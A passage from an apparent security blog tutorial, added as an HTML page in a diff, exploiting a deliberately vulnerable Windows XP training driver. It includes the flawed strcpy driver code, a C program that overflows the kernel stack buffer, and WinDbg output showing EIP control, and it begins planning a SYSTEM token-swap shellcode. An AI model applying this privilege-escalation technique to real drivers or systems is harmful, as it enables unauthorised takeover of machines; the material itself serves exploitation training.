@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  	<meta charset="utf-8">
+  	<title>Dimitri Fourny | Kernel buffer overflow on Windows</title>
+  	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  	<meta name="description" content="Passionate security researcher.">
+  	<meta name="author" content="Dimitri Fourny">
+	
+	<link href="/css/bootstrap.min.css" rel="stylesheet">
+    <link href="/css/style.css" rel="stylesheet">
+  	<link href="/css/syntax.css" rel="stylesheet">
+
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  	<link rel="shortcut icon" href="/img/favicon.png">
+</head>
+
+<body>
+	<div class="navbar navbar-default navbar-static-top" role="navigation">
+		<div class="container">
+			<div class="navbar-header">
+				<a class="navbar-brand" href="/">Dimitri Fourny</a>
+	          	<button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main">
+	            	<span class="icon-bar"></span>
+	            	<span class="icon-bar"></span>
+	            	<span class="icon-bar"></span>
+	          	</button>
+		    </div>
+
+		    <div class="navbar-collapse collapse" id="navbar-main">
+		      <ul class="nav navbar-nav navbar-right">
+                <li class="active"><a href="/">Home</a></li>
+		        <li><a href="https://twitter.com/DimitriFourny">Twitter</a></li>
+		        <li><a href="http://fr.linkedin.com/pub/dimitri-fourny/58/283/13a/">Linkedin</a></li>
+		        <li><a href="/feed.xml">RSS</a></li>
+		      </ul>
+		    </div>
+		</div>
+	</div>
+
+	<div class="container">
+		
+		<div class="row">
+			<div class="col-sm-12">
+				<h1 id="kernel-buffer-overflow-on-windows">Kernel buffer overflow on Windows</h1>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>The buffer overflow are cool in user-land and they can be more funny in kernel-land. 
+This time, we will use a buffer overflow to make an escalade privilege to get the SYSTEM rights, so we will could make anything we want on the system. To train us, we do not need to code a driver yourself: <a href="https://twitter.com/0vercl0k">0vercl0k</a> have done it for us ! So we got the files of <a href="https://github.com/0vercl0k/Windows-Kernel-Flaws">level 1</a> and we start our XP VM.</p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;Ntifs.h&gt;
+</span>
+<span class="cp">#define ERROR(_f_, _status_) DbgPrint("\r\n[!] Error at %s() : 0x%x\r\n", _f_, _status_)
+#define IOCTL_HI CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define DbgPrint(...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0x1337, __VA_ARGS__)
+</span>
+<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">DWORD</span><span class="p">;</span>
+<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">PBYTE</span><span class="p">;</span>
+<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">BYTE</span><span class="p">;</span>
+
+<span class="c1">//
+</span><span class="n">DRIVER_UNLOAD</span> <span class="n">Unload</span><span class="p">;</span>
+<span class="n">DRIVER_INITIALIZE</span> <span class="n">DriverEntry</span><span class="p">;</span>
+<span class="n">DRIVER_DISPATCH</span> <span class="n">handleIOCTLs</span><span class="p">;</span>
+<span class="n">DRIVER_DISPATCH</span> <span class="n">handleIRP</span><span class="p">;</span>
+<span class="c1">//
+</span>
+<span class="n">NTSTATUS</span> <span class="nf">DriverEntry</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">pDriverObj</span> <span class="p">,</span> <span class="n">PUNICODE_STRING</span> <span class="n">pRegistryPath</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">NTSTATUS</span> <span class="n">status</span><span class="p">;</span>
+    <span class="n">UNICODE_STRING</span> <span class="n">deviceName</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">},</span> <span class="n">symlinkName</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">PDEVICE_OBJECT</span> <span class="n">pDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+    <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">DriverUnload</span> <span class="o">=</span> <span class="n">Unload</span><span class="p">;</span>
+    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Loading.. ]</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">deviceName</span><span class="p">,</span> <span class="s">L"</span><span class="se">\\</span><span class="s">Device</span><span class="se">\\</span><span class="s">1"</span><span class="p">);</span>
+    <span class="n">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">symlinkName</span><span class="p">,</span> <span class="s">L"</span><span class="se">\\</span><span class="s">DosDevices</span><span class="se">\\</span><span class="s">1"</span><span class="p">);</span>
+
+    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Creating the device...]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">IoCreateDevice</span><span class="p">(</span>
+        <span class="n">pDriverObj</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span>
+        <span class="o">&amp;</span><span class="n">deviceName</span><span class="p">,</span>
+        <span class="n">FILE_DEVICE_UNKNOWN</span><span class="p">,</span>
+        <span class="n">FILE_DEVICE_SECURE_OPEN</span><span class="p">,</span>
+        <span class="n">FALSE</span><span class="p">,</span>
+        <span class="o">&amp;</span><span class="n">pDevice</span>
+    <span class="p">);</span>
+
+    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Linking...]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">IoCreateSymbolicLink</span><span class="p">(</span><span class="o">&amp;</span><span class="n">symlinkName</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">deviceName</span><span class="p">);</span>
+
+    <span class="k">for</span><span class="p">(;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">IRP_MJ_MAXIMUM_FUNCTION</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">handleIRP</span><span class="p">;</span>
+
+    <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">IRP_MJ_DEVICE_CONTROL</span><span class="p">]</span> <span class="o">=</span> <span class="n">handleIOCTLs</span><span class="p">;</span>
+    <span class="k">return</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">NTSTATUS</span> <span class="nf">handleIRP</span><span class="p">(</span><span class="n">PDEVICE_OBJECT</span> <span class="n">pDeviceObject</span><span class="p">,</span> <span class="n">PIRP</span> <span class="n">Irp</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">NTSTATUS</span> <span class="nf">handleIOCTLs</span><span class="p">(</span><span class="n">PDEVICE_OBJECT</span> <span class="n">pDeviceObject</span><span class="p">,</span> <span class="n">PIRP</span> <span class="n">pIrp</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">PIO_STACK_LOCATION</span> <span class="n">pIoStackLocation</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">ioControlCode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">inputBufferLength</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">inputBuffer</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">BYTE</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+
+    <span class="n">pIoStackLocation</span> <span class="o">=</span> <span class="n">IoGetCurrentIrpStackLocation</span><span class="p">(</span><span class="n">pIrp</span><span class="p">);</span>
+    <span class="n">ioControlCode</span> <span class="o">=</span> <span class="n">pIoStackLocation</span><span class="o">-&gt;</span><span class="n">Parameters</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">.</span><span class="n">IoControlCode</span><span class="p">;</span>
+    <span class="n">inputBufferLength</span> <span class="o">=</span> <span class="n">pIoStackLocation</span><span class="o">-&gt;</span><span class="n">Parameters</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">.</span><span class="n">InputBufferLength</span><span class="p">;</span>
+    <span class="n">inputBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">pIrp</span><span class="o">-&gt;</span><span class="n">AssociatedIrp</span><span class="p">.</span><span class="n">SystemBuffer</span><span class="p">;</span>
+
+    <span class="k">switch</span><span class="p">(</span><span class="n">ioControlCode</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">case</span> <span class="n">IOCTL_HI</span><span class="p">:</span>
+        <span class="p">{</span>
+            <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Let's copying this buffer...]"</span><span class="p">);</span>
+
+            <span class="cm">/* ! w00tz ! */</span>
+            <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">inputBuffer</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="n">IoCompleteRequest</span><span class="p">(</span><span class="n">pIrp</span><span class="p">,</span> <span class="n">IO_NO_INCREMENT</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">pIrp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">VOID</span> <span class="nf">Unload</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">pDrivObj</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Unloading.. ]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>It is easy to see the problem: the copy size in <em>strcpy</em> is not checked!</p>
+
+<h2 id="tools">Tools</h2>
+
+<p>To test the driver, we will need the <a href="http://msdn.microsoft.com/en-us/windows/hardware/hh852365.aspx">Windows Driver Kit and WinDbg</a> and a assembly code compiler, <a href="http://flatassembler.net/download.php">FASM</a>.<br />
+To compile with the WDK, we need to make a file with the name “makefile”:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">!</span><span class="n">INCLUDE</span> <span class="err">$</span><span class="p">(</span><span class="n">NTMAKEENV</span><span class="p">)</span><span class="err">\</span><span class="n">makefile</span><span class="p">.</span><span class="n">def</span></code></pre></figure>
+
+<p>Fo a driver, the file “sources”:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">TARGETNAME</span> <span class="o">=</span> <span class="n">level1</span>
+<span class="n">TARGETPATH</span> <span class="o">=</span> <span class="n">obj</span>
+<span class="n">TARGETTYPE</span> <span class="o">=</span> <span class="n">DRIVER</span>
+
+<span class="n">INCLUDES</span> <span class="o">=</span> <span class="err">%</span><span class="n">BUILD</span><span class="err">%\</span><span class="k">inc</span>
+<span class="n">LIBS</span> <span class="o">=</span> <span class="err">%</span><span class="n">BUILD</span><span class="err">%\</span><span class="n">lib</span>
+
+<span class="n">SOURCES</span> <span class="o">=</span> <span class="n">level1</span><span class="p">.</span><span class="n">c</span></code></pre></figure>
+
+<p>And the “sources” file for a simple .exe:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">TARGETNAME</span><span class="o">=</span><span class="n">exploit</span>
+<span class="n">TARGETTYPE</span><span class="o">=</span><span class="n">PROGRAM</span>
+
+<span class="n">INCLUDES</span><span class="o">=</span>
+
+<span class="n">SOURCES</span><span class="o">=</span><span class="n">exploit</span><span class="p">.</span><span class="n">c</span>
+
+<span class="n">UMTYPE</span><span class="o">=</span><span class="n">console</span>
+<span class="n">UMBASE</span><span class="o">=</span><span class="mh">0x04000000</span>
+
+<span class="n">USE_MSVCRT</span><span class="o">=</span><span class="mi">1</span></code></pre></figure>
+
+<h2 id="debug-a-vm">Debug a VM</h2>
+
+<p>In Windows VM, <strong>msconfig.exe -&gt; BOOT.ini -&gt; Advanced -&gt; /DEBUG /DEBUGPORT=COM1:</strong>  and reboot.<br />
+In VirtualBox, <strong>Machine -&gt; Settings -&gt; Serial Ports</strong> and configure it.<br />
+In WinDbg, <strong>File -&gt; Kernel Debug… -&gt; COM</strong> and click on <strong>OK</strong>.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>Now, we can load our driver with <a href="http://www.osronline.com/article.cfm?name=osrloaderv30.zip&amp;id=157">Driver Loader</a>, and we test our entry:</p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;windows.h&gt;
+#include &lt;winioctl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="cp">#define IOCTL_HI CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define DEVICE_NAME "\\\\.\\1"
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">DWORD</span> <span class="n">byte</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lenMagik</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">UCHAR</span> <span class="n">magik</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+
+    <span class="n">memset</span><span class="p">(</span><span class="n">magik</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mi">276</span><span class="p">);</span> <span class="c1">// Padding
+</span>    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">276</span><span class="p">;</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">magik</span><span class="o">+</span><span class="mi">276</span><span class="p">,</span> <span class="s">"</span><span class="se">\x42\x42\x42\x42\x00</span><span class="s">"</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span> <span class="c1">// Shellcode address?
+</span>    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>
+
+    <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span> <span class="o">|</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error with Createfile : %.8x.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IOCTL_HI</span><span class="p">,</span> <span class="n">magik</span><span class="p">,</span> <span class="n">lenMagik</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">Launching</span> <span class="n">OACR</span> <span class="k">monitor</span>
+
+<span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">WinDDK</span><span class="err">\</span><span class="mi">7600</span><span class="p">.</span><span class="mi">16385</span><span class="p">.</span><span class="mi">1</span><span class="o">&gt;</span><span class="n">cd</span> <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">driver</span><span class="err">\</span><span class="n">level0</span>
+
+<span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">driver</span><span class="err">\</span><span class="n">level0</span><span class="o">&gt;</span><span class="n">build</span>
+<span class="n">BUILD</span><span class="o">:</span> <span class="n">Compile</span> <span class="k">and</span> <span class="n">Link</span> <span class="n">for</span> <span class="n">x86</span>
+<span class="n">BUILD</span><span class="o">:</span> <span class="n">Loading</span> <span class="n">c</span><span class="o">:</span><span class="err">\</span><span class="n">winddk</span><span class="err">\</span><span class="mi">7600</span><span class="p">.</span><span class="mi">16385</span><span class="p">.</span><span class="mi">1</span><span class="err">\</span><span class="n">build</span><span class="p">.</span><span class="n">dat</span><span class="p">...</span>
+<span class="n">BUILD</span><span class="o">:</span> <span class="n">Computing</span> <span class="n">Include</span> <span class="n">file</span> <span class="n">dependencies</span><span class="o">:</span>
+<span class="n">BUILD</span><span class="o">:</span> <span class="n">Start</span> <span class="n">time</span><span class="o">:</span> <span class="n">Thu</span> <span class="n">Feb</span> <span class="mi">27</span> <span class="mi">09</span><span class="o">:</span><span class="mi">13</span><span class="o">:</span><span class="mi">48</span> <span class="mi">2014</span>
+<span class="n">BUILD</span><span class="o">:</span> <span class="n">Examining</span> <span class="n">c</span><span class="o">:</span><span class="err">\</span><span class="n">driver</span><span class="err">\</span><span class="n">level0</span> <span class="n">directory</span> <span class="n">for</span> <span class="n">files</span> <span class="n">to</span> <span class="n">compile</span><span class="p">.</span>
+    <span class="n">c</span><span class="o">:</span><span class="err">\</span><span class="n">driver</span><span class="err">\</span><span class="n">level0</span> <span class="n">Invalidating</span> <span class="n">OACR</span> <span class="n">warning</span> <span class="n">log</span> <span class="n">for</span> <span class="err">'</span><span class="n">root</span><span class="o">:</span><span class="n">x86chk</span><span class="err">'</span>
+<span class="n">BUILD</span><span class="o">:</span> <span class="n">Saving</span> <span class="n">c</span><span class="o">:</span><span class="err">\</span><span class="n">winddk</span><span class="err">\</span><span class="mi">7600</span><span class="p">.</span><span class="mi">16385</span><span class="p">.</span><span class="mi">1</span><span class="err">\</span><span class="n">build</span><span class="p">.</span><span class="n">dat</span><span class="p">...</span>
+<span class="n">BUILD</span><span class="o">:</span> <span class="n">Compiling</span> <span class="k">and</span> <span class="n">Linking</span> <span class="n">c</span><span class="o">:</span><span class="err">\</span><span class="n">driver</span><span class="err">\</span><span class="n">level0</span> <span class="n">directory</span>
+<span class="n">Configuring</span> <span class="n">OACR</span> <span class="n">for</span> <span class="err">'</span><span class="n">root</span><span class="o">:</span><span class="n">x86chk</span><span class="err">'</span> <span class="o">-</span> <span class="o">&lt;</span><span class="n">OACR</span> <span class="n">on</span><span class="o">&gt;</span>
+<span class="n">_NT_TARGET_VERSION</span> <span class="n">SET</span> <span class="n">TO</span> <span class="n">WINXP</span>
+<span class="n">Compiling</span> <span class="o">-</span> <span class="n">exploit</span><span class="p">.</span><span class="n">c</span>
+<span class="n">Linking</span> <span class="n">Executable</span> <span class="o">-</span> <span class="n">objchk_wxp_x86</span><span class="err">\</span><span class="n">i386</span><span class="err">\</span><span class="n">exploit</span><span class="p">.</span><span class="n">exe</span>
+<span class="n">BUILD</span><span class="o">:</span> <span class="n">Finish</span> <span class="n">time</span><span class="o">:</span> <span class="n">Thu</span> <span class="n">Feb</span> <span class="mi">27</span> <span class="mi">09</span><span class="o">:</span><span class="mi">13</span><span class="o">:</span><span class="mi">58</span> <span class="mi">2014</span>
+<span class="n">BUILD</span><span class="o">:</span> <span class="n">Done</span>
+
+    <span class="mi">3</span> <span class="n">files</span> <span class="n">compiled</span> <span class="o">-</span> <span class="mi">1</span> <span class="n">Warning</span> <span class="o">-</span> <span class="mi">30</span> <span class="n">LPS</span>
+    <span class="mi">1</span> <span class="n">executable</span> <span class="n">built</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">g</span>
+<span class="err">[</span> <span class="n">Loading</span><span class="p">..</span> <span class="err">]</span>
+<span class="err">[</span> <span class="n">Creating</span> <span class="n">the</span> <span class="n">device</span><span class="p">...</span><span class="err">]</span>
+<span class="err">[</span> <span class="n">Linking</span><span class="p">...</span><span class="err">]</span>
+
+<span class="n">kd</span><span class="o">&gt;</span> <span class="n">lm</span>
+<span class="n">start</span>    <span class="n">end</span>        <span class="n">module</span> <span class="n">name</span>
+<span class="mi">804</span><span class="n">d7000</span> <span class="mi">806</span><span class="n">cfe00</span>   <span class="n">nt</span>         <span class="p">(</span><span class="n">pdb</span> <span class="n">symbols</span><span class="p">)</span>          <span class="n">c</span><span class="o">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">symbols</span><span class="err">\</span><span class="n">xp</span><span class="err">\</span><span class="n">exe</span><span class="err">\</span><span class="n">ntkrnlpa</span><span class="p">.</span><span class="n">pdb</span>
+<span class="n">baf7d000</span> <span class="n">baf7da80</span>   <span class="mi">1</span>          <span class="p">(</span><span class="n">deferred</span><span class="p">)</span>             
+
+<span class="n">kd</span><span class="o">&gt;</span> <span class="o">?</span> <span class="err">$</span><span class="n">iment</span><span class="p">(</span><span class="mh">0xbaf7d000</span><span class="p">)</span>
+<span class="n">Evaluate</span> <span class="n">expression</span><span class="o">:</span> <span class="o">-</span><span class="mi">1158163440</span> <span class="o">=</span> <span class="n">baf7d410</span>
+
+<span class="n">kd</span><span class="o">&gt;</span> <span class="n">uf</span> <span class="n">baf7d410</span>
+<span class="p">...</span>
+<span class="mi">1</span><span class="o">+</span><span class="mh">0x4f7</span><span class="o">:</span>
+<span class="n">baf7d4f7</span> <span class="mi">8</span><span class="n">b4508</span>          <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span>
+<span class="n">baf7d4fa</span> <span class="n">c7407020d5f7ba</span>  <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">70</span><span class="n">h</span><span class="err">]</span><span class="p">,</span><span class="n">offset</span> <span class="mi">1</span><span class="o">+</span><span class="mh">0x520</span> <span class="p">(</span><span class="n">baf7d520</span><span class="p">)</span>
+<span class="n">baf7d501</span> <span class="mi">33</span><span class="n">c0</span>            <span class="k">xor</span>     <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
+<span class="n">baf7d503</span> <span class="mi">8</span><span class="n">be5</span>            <span class="k">mov</span>     <span class="n">esp</span><span class="p">,</span><span class="n">ebp</span>
+<span class="n">baf7d505</span> <span class="mi">5</span><span class="n">d</span>              <span class="k">pop</span>     <span class="n">ebp</span>
+<span class="n">baf7d506</span> <span class="n">c20800</span>          <span class="k">ret</span>     <span class="mi">8</span>
+
+<span class="n">kd</span><span class="o">&gt;</span> <span class="n">uf</span> <span class="n">baf7d520</span>
+<span class="p">...</span>
+<span class="mi">1</span><span class="o">+</span><span class="mh">0x61b</span><span class="o">:</span>
+<span class="n">baf7d61b</span> <span class="mi">32</span><span class="n">d2</span>            <span class="k">xor</span>     <span class="n">dl</span><span class="p">,</span><span class="n">dl</span>
+<span class="n">baf7d61d</span> <span class="mi">8</span><span class="n">b4d0c</span>          <span class="k">mov</span>     <span class="n">ecx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="mi">0</span><span class="n">Ch</span><span class="err">]</span>
+<span class="n">baf7d620</span> <span class="n">ff150cd8f7ba</span>    <span class="k">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="mi">1</span><span class="o">+</span><span class="mh">0x80c</span> <span class="p">(</span><span class="n">baf7d80c</span><span class="p">)</span><span class="err">]</span>
+<span class="n">baf7d626</span> <span class="mi">8</span><span class="n">b450c</span>          <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="mi">0</span><span class="n">Ch</span><span class="err">]</span>
+<span class="n">baf7d629</span> <span class="mi">8</span><span class="n">b4018</span>          <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">18</span><span class="n">h</span><span class="err">]</span>
+<span class="n">baf7d62c</span> <span class="mi">8</span><span class="n">be5</span>            <span class="k">mov</span>     <span class="n">esp</span><span class="p">,</span><span class="n">ebp</span>
+<span class="n">baf7d62e</span> <span class="mi">5</span><span class="n">d</span>              <span class="k">pop</span>     <span class="n">ebp</span>
+<span class="n">baf7d62f</span> <span class="n">c20800</span>          <span class="k">ret</span>     <span class="mi">8</span>
+
+<span class="n">kd</span><span class="o">&gt;</span> <span class="n">bp</span> <span class="n">baf7d62f</span></code></pre></figure>
+
+<p>All is ready ! We <code>!go</code> and WinDbg look like that:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">g</span>
+<span class="err">[</span> <span class="n">Let</span><span class="err">'</span><span class="n">s</span> <span class="n">copying</span> <span class="n">this</span> <span class="n">buffer</span><span class="p">...</span><span class="err">]</span><span class="n">Breakpoint</span> <span class="mi">0</span> <span class="n">hit</span>
+<span class="mi">1</span><span class="o">+</span><span class="mh">0x62f</span><span class="o">:</span>
+<span class="n">baf7d62f</span> <span class="n">c20800</span>          <span class="k">ret</span>     <span class="mi">8</span>
+
+<span class="n">kd</span><span class="o">&gt;</span> <span class="kt">dd</span> <span class="n">esp</span>
+<span class="n">b9019c38</span>  <span class="mi">42424242</span> <span class="mi">8657</span><span class="n">fc00</span> <span class="mi">863</span><span class="n">b0700</span> <span class="mi">806</span><span class="n">d1070</span>
+<span class="n">b9019c48</span>  <span class="mi">80574</span><span class="n">d5e</span> <span class="mi">863</span><span class="n">b0770</span> <span class="mi">8672</span><span class="n">a420</span> <span class="mi">863</span><span class="n">b0700</span>
+
+<span class="n">kd</span><span class="o">&gt;</span> <span class="n">t</span>
+<span class="mi">42424242</span> <span class="o">??</span>              <span class="o">???</span></code></pre></figure>
+
+<p>We control EIP ! Therefore, we will put a shellcode in userland to make an escalade privilege of our process.<br />
+After that, we will point EIP to our shellcode and hop, our process have the SYSTEM rights!</p>
+
+<h2 id="shellcode">Shellcode</h2>
+
+<p>How we can do to code this shellcode? We just need to swap the SYSTEM token with our process token and is done!
+Good, we look for structures in our Windows friend:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">r</span> <span class="n">fs</span>
+<span class="n">fs</span><span class="o">=</span><span class="mi">00000030</span>
+
+<span class="n">kd</span><span class="o">&gt;</span> <span class="n">dg</span> <span class="n">fs</span>
+                                  <span class="n">P</span> <span class="n">Si</span> <span class="n">Gr</span> <span class="n">Pr</span> <span class="n">Lo</span>
+<span class="n">Sel</span>    <span class="n">Base</span>     <span class="n">Limit</span>     <span class="n">Type</span>    <span class="n">l</span> <span class="n">ze</span> <span class="n">an</span> <span class="n">es</span> <span class="n">ng</span> <span class="n">Flags</span>
+<span class="o">----</span> <span class="o">--------</span> <span class="o">--------</span> <span class="o">----------</span> <span class="o">-</span> <span class="o">--</span> <span class="o">--</span> <span class="o">--</span> <span class="o">--</span> <span class="o">--------</span>
+<span class="mi">0030</span> <span class="n">ffdff000</span> <span class="mi">00001</span><span class="n">fff</span> <span class="n">Data</span> <span class="n">RW</span> <span class="n">Ac</span> <span class="mi">0</span> <span class="n">Bg</span> <span class="n">Pg</span> <span class="n">P</span>  <span class="n">Nl</span> <span class="mi">00000</span><span class="n">c93</span>
+
+<span class="n">kd</span><span class="o">&gt;</span> <span class="kt">dt</span> <span class="n">_KPCR</span> <span class="n">ffdff000</span>
+<span class="n">nt</span><span class="err">!</span><span class="n">_KPCR</span>
+   <span class="o">+</span><span class="mh">0x000</span> <span class="n">NtTib</span>            <span class="o">:</span> <span class="n">_NT_TIB</span>
+   <span class="o">+</span><span class="mh">0x01c</span> <span class="n">SelfPcr</span>          <span class="o">:</span> <span class="mh">0xffdff000</span> <span class="n">_KPCR</span>
